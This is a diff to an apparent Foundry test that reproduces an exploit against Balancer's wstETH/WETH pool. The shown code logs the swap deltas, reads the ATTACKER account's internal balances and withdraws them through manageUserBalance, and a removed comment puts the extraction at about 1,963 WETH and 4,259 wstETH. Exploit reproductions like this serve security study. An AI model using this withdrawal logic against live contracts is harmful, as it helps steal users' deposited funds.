@@ -285,71 +285,37 @@ contract BalancerWstEthWethPoolTest is Test {
             block.timestamp + 3600
         );
 
-        console.log("BatchSwap executed successfully!");
+        console.log("BatchSwap executed!");
         console.log("Asset deltas:");
         console.log("  wstETH:", uint256(-assetDeltas[0]) / 1e18, "ETH");
         console.log("  BPT:", uint256(-assetDeltas[1]) / 1e18, "ETH");
         console.log("  WETH:", uint256(-assetDeltas[2]) / 1e18, "ETH");
+        console.log("=== WITHDRAWAL manageUserBalance()");
 
-        // withdraw from internal balance using manageUserBalance()
         IERC20[] memory internalTokens = new IERC20[](3);
         internalTokens[0] = IERC20(wstETH);
         internalTokens[1] = IERC20(wstETH_WETH_BPT);
         internalTokens[2] = IERC20(address(WETH));
-
         uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);
 
-        console.log("");
-        console.log("=== INTERNAL BALANCES");
-        console.log("Internal wstETH:", internalBalances[0] / 1e18, "ETH");
-        console.log("Internal BPT:", internalBalances[1] / 1e18, "ETH");
-        console.log("Internal WETH:", internalBalances[2] / 1e18, "ETH");
+        console.log("Internal balances:");
+        console.log("  wstETH:", internalBalances[0] / 1e18, "ETH");
+        console.log("  BPT:", internalBalances[1] / 1e18, "ETH");
+        console.log("  WETH:", internalBalances[2] / 1e18, "ETH");
 
         if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
             uint256 opsCount = 0;
             if (internalBalances[0] > 0) opsCount++;
             if (internalBalances[1] > 0) opsCount++;
             if (internalBalances[2] > 0) opsCount++;
-
             IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
             uint256 opIndex = 0;
-
-            if (internalBalances[0] > 0) {
-                ops[opIndex] = IBalancerVault.UserBalanceOp({
-                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
-                    asset: IAsset(wstETH),
-                    amount: internalBalances[0],
-                    sender: ATTACKER,
-                    recipient: payable(ATTACKER)
-                });
-                opIndex++;
-            }
-
-            if (internalBalances[1] > 0) {
-                ops[opIndex] = IBalancerVault.UserBalanceOp({
-                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
-                    asset: IAsset(wstETH_WETH_BPT),
-                    amount: internalBalances[1],
-                    sender: ATTACKER,
-                    recipient: payable(ATTACKER)
-                });
-                opIndex++;
-            }
-
-            if (internalBalances[2] > 0) {
-                ops[opIndex] = IBalancerVault.UserBalanceOp({
-                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
-                    asset: IAsset(address(WETH)),
-                    amount: internalBalances[2],
-                    sender: ATTACKER,
-                    recipient: payable(ATTACKER)
-                });
-            }
-
+            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(wstETH), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
+            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(wstETH_WETH_BPT), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
+            if (internalBalances[2] > 0) ops[opIndex] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(address(WETH)), amount: internalBalances[2], sender: ATTACKER, recipient: payable(ATTACKER)});
             VAULT.manageUserBalance(ops);
-            console.log("manageUserBalance executed!");
+            console.log("Withdrawal completed!");
         }
-
         vm.stopPrank();
 
         (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);
@@ -379,7 +345,6 @@ contract BalancerWstEthWethPoolTest is Test {
         console.log("BPT:", IERC20(wstETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
 
-        // Expected: ~1,963 WETH + ~4,259 wstETH extracted
         console.log("");
         console.log("SUCCESS!");
     }
